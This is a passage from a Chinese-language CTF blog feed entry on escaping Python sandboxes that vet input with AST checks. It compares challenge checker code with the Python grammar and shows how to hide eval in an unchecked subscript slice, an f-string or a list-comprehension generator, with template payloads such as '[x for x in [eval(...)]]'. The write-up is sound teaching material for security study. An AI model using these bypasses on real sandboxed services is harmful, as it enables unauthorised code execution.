class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;List&#x27;</span>: [<span class="string">&#x27;elts&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Tuple&#x27;</span>: [<span class="string">&#x27;elts&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;Expr&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>], <span class="comment"># root node </span></span><br><span class="line">            <span class="string">&#x27;comprehension&#x27;</span>: [<span class="string">&#x27;target&#x27;</span>, <span class="string">&#x27;iter&#x27;</span>, <span class="string">&#x27;ifs&#x27;</span>],</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> attributes.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(ast, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(node, <span class="built_in">getattr</span>(ast, k)):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">bool</span>):</span><br><span class="line">                    <span class="keyword">return</span> v</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">all</span>([check(<span class="built_in">getattr</span>(node, attr)) <span class="keyword">for</span> attr <span class="keyword">in</span> v])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    expr = sys.stdin.readline()</span><br><span class="line">    body = ast.parse(expr).body</span><br></pre></td></tr></table></figure><p>这道题目的代码就更加明确了，道理是类似的</p><h2 id="绕过语法树检查"><a href="#绕过语法树检查" class="headerlink" title="绕过语法树检查"></a>绕过语法树检查</h2><p>正如前面说的，我们需要找检查程序中的漏洞</p><h3 id="寻找没有遍历到的子节点"><a href="#寻找没有遍历到的子节点" class="headerlink" title="寻找没有遍历到的子节点"></a>寻找没有遍历到的子节点</h3><p>我们发现，在题目的程序中，都是手动编写了对某个抽象语法的哪些部分进行检测，所以可能就会出现某个语法的某个部分没被检测到的情况。</p><p>这时候就可以去和 <a href="https://docs.python.org/3/library/ast.html#abstract-grammar">AST文档中抽象语法</a> 对比，文档中给出的 ast.expr 包含了：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">expr</span> = <span class="type">BoolOp</span>(boolop op, expr* values)</span><br><span class="line">     | <span class="type">NamedExpr</span>(expr target, expr value)</span><br><span class="line">     | <span class="type">BinOp</span>(expr left, operator op, expr right)</span><br><span class="line">     | <span class="type">UnaryOp</span>(unaryop op, expr operand)</span><br><span class="line">     | <span class="type">Lambda</span>(arguments args, expr body)</span><br><span class="line">     | <span class="type">IfExp</span>(expr test, expr body, expr orelse)</span><br><span class="line">     | <span class="type">Dict</span>(expr* keys, expr* values)</span><br><span class="line">     | <span class="type">Set</span>(expr* elts)</span><br><span class="line">     | <span class="type">ListComp</span>(expr elt, comprehension* generators)</span><br><span class="line">     | <span class="type">SetComp</span>(expr elt, comprehension* generators)</span><br><span class="line">     | <span class="type">DictComp</span>(expr key, expr value, comprehension* generators)</span><br><span class="line">     | <span class="type">GeneratorExp</span>(expr elt, comprehension* generators)</span><br><span class="line">     <span class="comment">-- the grammar constrains where yield expressions can occur</span></span><br><span class="line">     | <span class="type">Await</span>(expr value)</span><br><span class="line">     | <span class="type">Yield</span>(expr? value)</span><br><span class="line">     | <span class="type">YieldFrom</span>(expr value)</span><br><span class="line">     <span class="comment">-- need sequences for compare to distinguish between</span></span><br><span class="line">     <span class="comment">-- x &lt; 4 &lt; 3 and (x &lt; 4) &lt; 3</span></span><br><span class="line">     | <span class="type">Compare</span>(expr left, cmpop* ops, expr* comparators)</span><br><span class="line">     | <span class="type">Call</span>(expr func, expr* args, keyword* keywords)</span><br><span class="line">     | <span class="type">FormattedValue</span>(expr value, int? conversion, expr? format_spec)</span><br><span class="line">     | <span class="type">JoinedStr</span>(expr* values)</span><br><span class="line">     | <span class="type">Constant</span>(constant value, string? kind)</span><br><span class="line"></span><br><span class="line">     <span class="comment">-- the following expression can appear in assignment context</span></span><br><span class="line">     | <span class="type">Attribute</span>(expr value, identifier attr, expr_context ctx)</span><br><span class="line">     | <span class="type">Subscript</span>(expr value, expr slice, expr_context ctx)</span><br><span class="line">     | <span class="type">Starred</span>(expr value, expr_context ctx)</span><br><span class="line">     | <span class="type">Name</span>(identifier id, expr_context ctx)</span><br><span class="line">     | <span class="type">List</span>(expr* elts, expr_context ctx)</span><br><span class="line">     | <span class="type">Tuple</span>(expr* elts, expr_context ctx)</span><br><span class="line"></span><br><span class="line">     <span class="comment">-- can appear only in Subscript</span></span><br><span class="line">     | <span class="type">Slice</span>(expr? lower, expr? upper, expr? step)</span><br></pre></td></tr></table></figure><p>比如，BinOp(expr left, operator op, expr right) 表示了二元运算这个语法，left 表示左侧的表达式，op 表示二元运算符，right 表示右侧表达式。<br>同理 ListComp(expr elt, comprehension* generators) 中 elt 表示其中列表推导的元素，而 generator 则表示生成器子句</p><p>再来看 TWCTF 这道题，它的检查中写了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;Subscript&#x27;</span>: [<span class="string">&#x27;value&#x27;</span>],</span><br></pre></td></tr></table></figure><p>而文档中给的索引访问是 Subscript(expr value, expr slice, expr_context ctx)</p><p>因此可以发现程序并没有检测索引访问中的切片 slice，这样例如 a[…] 中的 … 部分就会被全部忽略<br>所以就可以在[]中藏一个eval执行我们想要的功能</p><h3 id="寻找没有检查的节点"><a href="#寻找没有检查的节点" class="headerlink" title="寻找没有检查的节点"></a>寻找没有检查的节点</h3><p>再来看 zjusec 这道题，通过对比可以发现所有检测的节点的子节点也都遍历了<br>但是再细看可以发现 FormattedValue 这个节点并没有在题目代码里出现</p><p>而且 ast.FormattedValue 属于 ast.expr，所以它既不会被检查，也不会抛出异常<br>看名字像是 f-string 相关，可以 dump 一下看看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ast.dump(ast.parse(<span class="string">&quot;f&#x27;&#123;x&#125;&#x27;&quot;</span>))</span><br><span class="line"><span class="string">&quot;Module(body=[Expr(value=JoinedStr(values=[FormattedValue(value=Name(id=&#x27;x&#x27;, ctx=Load()), conversion=-1, format_spec=None)]))], type_ignores=[])&quot;</span></span><br></pre></td></tr></table></figure><p>可以发现，f-string 是 JoinedStr，而 FormattedValue 是其中被格式化的部分</p><p>所以就可以向 f-string 的 {} 部分藏 eval 来干坏事了</p><h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p>这个是 pysandbox12 的一种解法<br>python中的语法不仅有 ast.expr 一种，而且很特别的是，列表推导 ListComp 的生成器子句并不是 ast.expr，而是 ast.comprehension</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ast.dump(ast.parse(<span class="string">&quot;[x for x in range(n)]&quot;</span>))</span><br><span class="line"><span class="string">&quot;Module(body=[Expr(value=ListComp(elt=Name(id=&#x27;x&#x27;, ctx=Load()), generators=[comprehension(target=Name(id=&#x27;x&#x27;, ctx=Store()), iter=Call(func=Name(id=&#x27;range&#x27;, ctx=Load()), args=[Name(id=&#x27;n&#x27;, ctx=Load())], keywords=[]), ifs=[], is_async=0)]))], type_ignores=[])&quot;</span></span><br></pre></td></tr></table></figure><p>但是 pysandbox13 这样排除了 ast.expr ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(node, ast.expr):</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;not allowed &quot;</span>+<span class="built_in">str</span>(node))</span><br></pre></td></tr></table></figure><p>但是12题中并没有，所以 ast.comprehension 这个类型完全没有被检查<br>因此直接向生成器表达式中插入坏东西即可：</p><ul><li><code>[x for x in [eval(...)]]</code></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-5-6d699f07f71c">TokyoWesterns CTF 4th 2018 Writeup — Part 5</a></li><li><a href="https://docs.python.org/3/library/ast.html">Documentation of ast</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;这类题是在zjusec.com上 ACTF 2019 分组中chenyuan出的一系列python沙箱逃逸题目中看到的&lt;br&gt;在网上搜索貌似也只能搜到 &lt;a href=&quot;https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-5-6d699f07f71c&quot;&gt;TokyoWesterns CTF 4th 2018&lt;/a&gt; 这一次比赛中的题目&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;这类题目不像普通的沙箱逃逸一样通过删除内置函数字典或者删除某些模块的内容来实现&lt;br&gt;而是在输入命令后即使用python的 ast 模块对其进行语法分析，只要使用了某些禁止的抽象语法，就抛出异常导致程序中断&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="https://blog.tonycrane.cc/tags/CTF/"/>
    
    <category term="python" scheme="https://blog.tonycrane.cc/tags/python/"/>
    
  </entry>
  
</feed>
